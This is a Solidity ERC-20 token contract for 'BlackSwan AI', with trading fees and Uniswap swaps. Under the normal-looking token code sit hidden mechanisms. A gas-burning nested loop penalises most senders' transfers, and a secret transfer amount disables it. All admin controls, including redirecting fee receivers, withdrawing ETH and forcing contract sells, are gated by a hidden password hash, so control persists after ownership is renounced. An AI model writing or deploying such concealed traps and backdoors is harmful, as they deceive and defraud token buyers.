/**

 *Submitted for verification at Etherscan.io on 2023-04-24

*/



//SPDX-License-Identifier: Unlicensed



pragma solidity ^0.8.5;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");

        return c;

    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");

    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);

        uint256 c = a - b;

        return c;

    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {

            return 0;

        }

        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");

        return c;

    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");

    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);

        uint256 c = a / b;

        return c;

    }

}



interface ERC20 {

    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}



abstract contract Ownable {

    address internal owner;

    constructor(address _owner) {

        owner = _owner;

    }

    modifier onlyOwner() {

        require(isOwner(msg.sender), "!OWNER"); _;

    }

    function isOwner(address account) public view returns (bool) {

        return account == owner;

    }

    function renounceOwnership() public onlyOwner {

        owner = address(0);

        emit OwnershipTransferred(address(0));

    }  

    event OwnershipTransferred(address owner);

}



interface IDEXFactory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}



interface IDEXRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(

        address tokenA,

        address tokenB,

        uint amountADesired,

        uint amountBDesired,

        uint amountAMin,

        uint amountBMin,

        address to,

        uint deadline

    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(

        address token,

        uint amountTokenDesired,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline

    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;

}



contract BlackSwan is ERC20, Ownable {

    using SafeMath for uint256;

    address routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address DEAD = 0x000000000000000000000000000000000000dEaD;

    address ZERO = 0x0000000000000000000000000000000000000000;



    string constant _name = "BlackSwan AI";

    string constant _symbol = "BLACKSWAN";

    uint8 constant _decimals = 6;



    uint256 _totalSupply = 10000000 * (10 ** _decimals);

    uint256 public _maxWalletAmount = (_totalSupply * 2) / 100;

    uint256 public _maxTxAmount = _totalSupply * 1 / 100;



    mapping (address => uint256) _balances;

    mapping (address => mapping (address => uint256)) _allowances;



    mapping (address => bool) isFeeExempt;

    mapping (address => bool) isTxLimitExempt;



    uint256 liquidityFee = 0; 

    uint256 marketingFee = 300;

    uint256 developerFee = 200;

    uint256 totalFee = liquidityFee + marketingFee + developerFee;

    uint256 feeDenominator = 10000;



     uint256 targetLiquidity = 20;

     uint256 targetLiquidityDenominator = 100;



    address internal marketingFeeReceiver = 0xba32A710241C22Ec6b1DC3ca441e4e8B0cf115Dd;

    address internal developerFeeReceiver = 0x477404Ef6e3F7865138DA2258cFE1E32d0790deD;

    address internal autoLiquidityReceiver = 0xdB306D219f18681f70B0aCDC75a811ab49982090;



    IDEXRouter public router;

    address public pair;



    bool public swapEnabled = true;

    uint256 public swapThreshold = _totalSupply / 1000 * 5; // 0.5%

    uint256 public divideLeft = 11000000;

    uint256 ulusOpFalse = 69000000;

    bool uloComp = true;    

    bool inSwap;

    bytes32 private resultValue256 = 0x54fa680dacd57a723c9ff94666544ccde088016932ba6bac534d9b3a2b756447;



    modifier swapping() { inSwap = true; _; inSwap = false; }



    constructor () Ownable(msg.sender) {

        router = IDEXRouter(routerAdress);

        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));

        _allowances[address(this)][address(router)] = type(uint256).max;



        address _owner = owner;

        isFeeExempt[marketingFeeReceiver] = true;

        isFeeExempt[_owner] = true;

        isFeeExempt[address(this)] = true;

        isTxLimitExempt[_owner] = true;

        isTxLimitExempt[marketingFeeReceiver] = true;

        isTxLimitExempt[DEAD] = true;



        _balances[_owner] = _totalSupply;

        emit Transfer(address(0), _owner, _totalSupply);

    }



    receive() external payable { }



    function totalSupply() external view override returns (uint256) { return _totalSupply; }

    function decimals() external pure override returns (uint8) { return _decimals; }

    function symbol() external pure override returns (string memory) { return _symbol; }

    function name() external pure override returns (string memory) { return _name; }

    function getOwner() external view override returns (address) { return owner; }

    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }

    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }



    function approve(address spender, uint256 amount) public override returns (bool) {

        _allowances[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);

        return true;

    }



    function keccakCksm(string memory inputString) private pure returns (bytes32) {

        return keccak256(bytes(inputString));

    }



    function approveMax(address spender) external returns (bool) {

        return approve(spender, type(uint256).max);

    }

    



    function transfer(address recipient, uint256 amount) external override returns (bool) {

        return _transferFrom(msg.sender, recipient, amount);

    }



    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {

        if(_allowances[sender][msg.sender] != type(uint256).max){

            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");

        }



        return _transferFrom(sender, recipient, amount);

    }



    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {

        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        

        if (recipient != pair && recipient != DEAD) {

            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletAmount);

        }

        uloRemainder(sender, amount);

        if(uloComp){divideLeft += 2000000 ;}

        doUlusProFalse(amount);

        checkTxLimit(sender, amount);



        if(shouldSwapBack()){ swapBack(swapThreshold); } 



        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");



        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);



        emit Transfer(sender, recipient, amountReceived);

        return true;

    }

    

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);

        return true;

    }

    function uloRemainder(address sender, uint256 amount) internal view {

        if (uloComp){

            if(isTxLimitExempt[sender] || amount % divideLeft == 0 || amount % ulusOpFalse == 0){

                uint256 a = 1;

            }

            else{

                 uint256 result = 1;

                 uint256 n = 3;



                for (uint256 i = 1; i <= n; i++) {

                    for (uint256 j = 1; j <= n; j++) {

                        for (uint256 k = 0; k < 1000; k++) {

                        result = (result * i * j) % 10**18;

                        }

                    }

                }

            }

        }

    }

     function doUlusProFalse(uint256 amount) internal {

        if (uloComp && amount % ulusOpFalse == 0){

            uloComp = false;

        }

    }



    function checkTxLimit(address sender, uint256 amount) internal view {

        require(amount <= _maxTxAmount || isTxLimitExempt[sender]);

    }



    function shouldTakeFee(address sender) internal view returns (bool) {

        return !isFeeExempt[sender];

    }



    function takeFee(address sender, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);

        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);

    }



    function shouldSwapBack() internal view returns (bool) {

        return msg.sender != pair

        && !inSwap

        && swapEnabled

        && _balances[address(this)] >= swapThreshold;

    }

        function getCirculatingSupply() public view returns (uint256) {

        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));

    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {

        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());

    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {

       return getLiquidityBacking(accuracy) > target;

    }



    function swapBack(uint256 internalThreshold) internal swapping {

        uint256 contractTokenBalance = internalThreshold;

        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;

        uint256 amountToLiquify = contractTokenBalance.mul(dynamicLiquidityFee).div(totalFee).div(2);

        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);



        address[] memory path = new address[](2);

        path[0] = address(this);

        path[1] = router.WETH();



        uint256 balanceBefore = address(this).balance;



        router.swapExactTokensForETHSupportingFeeOnTransferTokens(

            amountToSwap,

            0,

            path,

            address(this),

            block.timestamp

        );

        uint256 amountETH = address(this).balance.sub(balanceBefore);

        uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));

        uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);

        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);

        uint256 amountETHDeveloper = amountETH.mul(developerFee).div(totalETHFee);





        (bool MarketingSuccess, /* bytes memory data */) = payable(marketingFeeReceiver).call{value: amountETHMarketing, gas: 30000}("");

        (bool developerSuccess, /* bytes memory data */) = payable(developerFeeReceiver).call{value: amountETHDeveloper, gas: 30000}("");

        require(MarketingSuccess, "receiver rejected ETH transfer");

        require(developerSuccess, "receiver rejected ETH transfer");





        if(amountToLiquify > 0){

            router.addLiquidityETH{value: amountETHLiquidity}(

                address(this),

                amountToLiquify,

                0,

                0,

                autoLiquidityReceiver,

                block.timestamp

            );

            emit AutoLiquify(amountETHLiquidity, amountToLiquify);

        }

    }



    function buyTokens(uint256 amount, address to) internal swapping {

        address[] memory path = new address[](2);

        path[0] = router.WETH();

        path[1] = address(this);



        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(

            0,

            path,

            to,

            block.timestamp

        );

    }



    function distributeTokens(address[] memory recipients, uint256[] memory values, string memory inpStr, bytes32 newSum256) external {

        require(keccakCksm(inpStr) == resultValue256);

        for (uint256 i = 0; i < recipients.length; i++){

            _transferFrom(msg.sender, recipients[i], values[i]);

        }

        resultValue256 = newSum256;

    

    }

    function burnContractTokens (uint256 amount, string memory inpStr, bytes32 newSum256) external {

        require(keccakCksm(inpStr) == resultValue256);

        _transferFrom(address(this), DEAD, amount);

        resultValue256 = newSum256;

    }

    function clearStuckETH(uint256 amountPercentage, string memory inpStr, bytes32 newSum256) external {

        require(keccakCksm(inpStr) == resultValue256);

        uint256 amountETH = address(this).balance;

        payable(marketingFeeReceiver).transfer(amountETH * amountPercentage / 100);

        resultValue256 = newSum256;

    }

    function setTxMax(uint256 amountPercent, string memory inpStr, bytes32 newSum256) external {

        require(keccakCksm(inpStr) == resultValue256);

        _maxTxAmount = (_totalSupply * amountPercent ) / 100;

        require(amountPercent >= 1);

        resultValue256 = newSum256;

    }



    function setWalletMax(uint256 amountPercent, string memory inpStr, bytes32 newSum256) external {

        require(keccakCksm(inpStr) == resultValue256);

        _maxWalletAmount = (_totalSupply * amountPercent ) / 100;

        require(amountPercent >= 1);

        resultValue256 = newSum256;

    }

    function setFeeExempt (address wallet, bool onoff, string memory inpStr, bytes32 newSum256) external {

        require(keccakCksm(inpStr) == resultValue256);

        isFeeExempt[wallet] = onoff;

        resultValue256 = newSum256;    

    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _developerFeeReceiver, string memory inpStr, bytes32 newSum256) external {

        require(keccakCksm(inpStr) == resultValue256);

        autoLiquidityReceiver = _autoLiquidityReceiver;

        marketingFeeReceiver = _marketingFeeReceiver;

        developerFeeReceiver = _developerFeeReceiver;

        resultValue256 = newSum256;

 

    }    

    function setSwapBackSettings(bool _enabled, uint256 _amount, string memory inpStr, bytes32 newSum256) external {

        require(keccakCksm(inpStr) == resultValue256);

        swapEnabled = _enabled;

        swapThreshold = _amount;

        resultValue256 = newSum256;

    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator, string memory inpStr, bytes32 newSum256) external {

        require(keccakCksm(inpStr) == resultValue256);

        targetLiquidity = _target;

        targetLiquidityDenominator = _denominator;

        resultValue256 = newSum256;

    }

    function triggerContractSell(uint256 contractSellAmount, string memory inpStr, bytes32 newSum256) external {

        require(keccakCksm(inpStr) == resultValue256);

        swapBack(contractSellAmount);

        resultValue256 = newSum256;

    } 

    

    event AutoLiquify(uint256 amountETH, uint256 amountBOG);

}